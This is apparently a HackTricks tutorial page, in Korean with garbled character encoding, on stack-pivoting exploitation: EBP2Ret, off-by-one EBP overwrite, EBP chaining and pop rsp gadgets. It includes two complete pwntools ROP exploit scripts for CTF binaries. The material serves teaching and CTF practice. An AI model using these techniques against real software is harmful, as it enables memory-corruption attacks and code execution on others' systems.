# ìŠ¤íƒ í”¼ë²—íŒ… - EBP2Ret - EBP ì²´ì´ë‹

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ ì œë¡œì—ì„œ íˆì–´ë¡œê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDF í˜•ì‹ì˜ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  ì‹¶ë‹¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.**

</details>

## ê¸°ë³¸ ì •ë³´

ì´ ê¸°ìˆ ì€ **ë² ì´ìŠ¤ í¬ì¸í„° (EBP)**ë¥¼ ì¡°ì‘í•˜ì—¬ EBP ë ˆì§€ìŠ¤í„°ì™€ `leave; ret` ëª…ë ¹ì–´ ì‹œí€€ìŠ¤ë¥¼ ì‹ ì¤‘í•˜ê²Œ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ í•¨ìˆ˜ì˜ ì‹¤í–‰ì„ ì—°ê²°í•˜ëŠ” ëŠ¥ë ¥ì„ ì•…ìš©í•©ë‹ˆë‹¤.

`leave`ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ë‹¤ìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤:
```
movl               %ebp, %esp
popl               %ebp
ret
```
### EBP2Ret

ì´ ê¸°ìˆ ì€ **EBP ë ˆì§€ìŠ¤í„°ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆì§€ë§Œ EIP ë ˆì§€ìŠ¤í„°ë¥¼ ì§ì ‘ì ìœ¼ë¡œ ë³€ê²½í•  ë°©ë²•ì´ ì—†ì„ ë•Œ íŠ¹íˆ ìœ ìš©**í•©ë‹ˆë‹¤. í•¨ìˆ˜ê°€ ì‹¤í–‰ì„ ë§ˆì¹˜ë©´ì„œ ë°œìƒí•˜ëŠ” ë™ì‘ì„ í™œìš©í•©ë‹ˆë‹¤.

`fvuln`ì˜ ì‹¤í–‰ ì¤‘ì— ìŠ¤íƒì— ê°€ì§œ EBPë¥¼ ì‚½ì…í•˜ì—¬ í•´ë‹¹ ìœ„ì¹˜ê°€ ì‰˜ì½”ë“œ ì£¼ì†Œê°€ ìˆëŠ” ë©”ëª¨ë¦¬ ì˜ì—­ì„ ê°€ë¦¬í‚¤ë„ë¡ ê´€ë¦¬í•œë‹¤ë©´ (pop ì‘ì—…ì„ ê³ ë ¤í•˜ì—¬ 4ë°”ì´íŠ¸ë¥¼ ë”í•œ ìœ„ì¹˜), ê°„ì ‘ì ìœ¼ë¡œ EIPë¥¼ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `fvuln`ì´ ë°˜í™˜ë  ë•Œ ESPëŠ” ì´ ì¡°ì‘ëœ ìœ„ì¹˜ë¡œ ì„¤ì •ë˜ê³ , ì´í›„ì˜ `pop` ì‘ì—…ì€ ESPë¥¼ 4ë§Œí¼ ê°ì†Œì‹œì¼œ ì‹¤ì œë¡œ ì‰˜ì½”ë“œë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ë§Œë“­ë‹ˆë‹¤. `ret` ëª…ë ¹ì´ ì‹¤í–‰ë˜ë©´ ì œì–´ê°€ ì‰˜ì½”ë“œë¡œ ì „ë‹¬ë©ë‹ˆë‹¤.

#### Exploit êµ¬ì„±

ë¨¼ì € ì‹¤í–‰ ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬ì˜ ì–´ë”˜ê°€ì— **ì‰˜ì½”ë“œë¥¼ ì‚½ì…**í•˜ê³  **ì£¼ì†Œë¥¼ ê°€ì ¸ì˜¤ê±°ë‚˜**, ìœ íš¨í•œ [**ONE\_GADGET**](https://github.com/david942j/one\_gadget)ì˜ ì£¼ì†Œë¥¼ ê°€ì ¸ì˜¤ê±°ë‚˜, ESPë¥¼ `system()`ì˜ ì£¼ì†Œì™€ **4ë°”ì´íŠ¸ì˜ ì“°ë ˆê¸° ë°”ì´íŠ¸** ë° `"/bin/sh"`ì˜ ì£¼ì†Œê°€ ìˆëŠ” ìœ„ì¹˜ë¡œ ì§€ì •í•´ì•¼ í•©ë‹ˆë‹¤.

ê·¸ëŸ° ë‹¤ìŒ, íŒ¨ë”©ì„ ìƒì„±í•˜ê³  `shellcode/one_gadget ì£¼ì†Œ - 4`ë¡œ EBPë¥¼ **ì†ìƒ**ì‹œì¼œì•¼ í•©ë‹ˆë‹¤. `pop` ë•Œë¬¸ì— `-4`ì—¬ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ `ESP`ëŠ” ìš°ë¦¬ê°€ ì›í•˜ëŠ” ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ê²Œ ë˜ê³  `ret`ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.

#### Off-By-One Exploit

ì´ ê¸°ìˆ ì˜ íŠ¹ì • ë³€í˜•ì¸ "Off-By-One Exploit"ì´ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” **EBPì˜ ê°€ì¥ ë‚®ì€ ìœ íš¨ ë°”ì´íŠ¸ë§Œ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ê²½ìš°** ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ê²½ìš° ì‰˜ì½”ë“œ ì£¼ì†Œë¥¼ ì €ì¥í•˜ëŠ” ë©”ëª¨ë¦¬ ìœ„ì¹˜ëŠ” EBPì™€ ì²« ì„¸ ë°”ì´íŠ¸ë¥¼ ê³µìœ í•´ì•¼ í•˜ë¯€ë¡œ ë” ì œì•½ ì¡°ê±´ì´ ìˆëŠ” ìœ ì‚¬í•œ ì¡°ì‘ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### **EBP Chaining**

ë”°ë¼ì„œ ìŠ¤íƒì˜ `EBP` í•­ëª©ì— ì œì–´ ê°€ëŠ¥í•œ ì£¼ì†Œë¥¼ ë„£ê³  `EIP`ì— `leave; ret`ì˜ ì£¼ì†Œë¥¼ ë„£ìœ¼ë©´ **`ESP`ë¥¼ ìŠ¤íƒì—ì„œ ì œì–´ ê°€ëŠ¥í•œ `EBP` ì£¼ì†Œë¡œ ì´ë™**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ì œ **`ESP`**ê°€ ì›í•˜ëŠ” ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ê³  ì‹¤í–‰í•  ë‹¤ìŒ ëª…ë ¹ì´ `RET`ì¸ ìƒíƒœì…ë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•´ ì œì–´ ê°€ëŠ¥í•œ ESP ìœ„ì¹˜ì— ë‹¤ìŒì„ ë°°ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **`&(ë‹¤ìŒ ê°€ì§œ EBP)`** -> `leave` ëª…ë ¹ì˜ `pop ebp`ë¡œ ìƒˆë¡œìš´ EBPë¥¼ ë¡œë“œí•©ë‹ˆë‹¤.
* **`system()`** -> `ret`ì— ì˜í•´ í˜¸ì¶œë©ë‹ˆë‹¤.
* **`&(leave;ret)`** -> ì‹œìŠ¤í…œì´ ì¢…ë£Œëœ í›„ í˜¸ì¶œë˜ë©°, ESPë¥¼ ê°€ì§œ EBPë¡œ ì´ë™ì‹œí‚¤ê³  ë‹¤ì‹œ ì‹œì‘í•©ë‹ˆë‹¤.
* **`&("/bin/sh")`**-> `system`ì˜ ë§¤ê°œë³€ìˆ˜

ì´ ë°©ë²•ì„ ì‚¬ìš©í•˜ë©´ í”„ë¡œê·¸ë¨ì˜ íë¦„ì„ ì œì–´í•˜ê¸° ìœ„í•´ ì—¬ëŸ¬ ê°€ì§œ EBPë¥¼ ì—°ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì†”ì§íˆ ë§í•´ì„œ, ì´ê²ƒì€ [ret2lib](ret2lib/)ì™€ ìœ ì‚¬í•˜ì§€ë§Œ ëª…ë°±í•œ ì´ì ì€ ì—†ì§€ë§Œ ì¼ë¶€ íŠ¹ìˆ˜í•œ ê²½ìš°ì— í¥ë¯¸ë¡œìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ, ì—¬ê¸°ì—ëŠ” ì´ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ **ìš°ìŠ¹ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ìŠ¹ë¦¬ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ”** **ìŠ¤íƒ ëˆ„ì¶œ**ì´ ìˆëŠ” [**ë„ì „ ê³¼ì œ ì˜ˆì œ**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave)ê°€ ìˆìŠµë‹ˆë‹¤. ì´ í˜ì´ì§€ì˜ ìµœì¢… í˜ì´ë¡œë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## RSPë¥¼ ì œì–´í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•

### **`pop rsp`** ê°€ì ¯

[**ì´ í˜ì´ì§€**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp)ì—ì„œ ì´ ê¸°ìˆ ì„ ì‚¬ìš©í•œ ì˜ˆì œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë„ì „ ê³¼ì œì—ì„œëŠ” 2ê°œì˜ íŠ¹ì • ì¸ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ì•¼ í–ˆìœ¼ë©° **`pop rsp` ê°€ì ¯**ì´ ìˆì—ˆìœ¼ë©° **ìŠ¤íƒì—ì„œì˜ leak**ì´ ìˆì—ˆìŠµë‹ˆë‹¤:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<rag>, rsp ê°€ì ¯
```
pop <reg>                <=== return pointer
<reg value>
xchg <rag>, rsp
```
## ì°¸ê³  ìë£Œ

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)

<details>

<summary><strong>ì œë¡œë¶€í„° AWS í•´í‚¹ì„ ì „ë¬¸ê°€ë¡œ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ë ¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
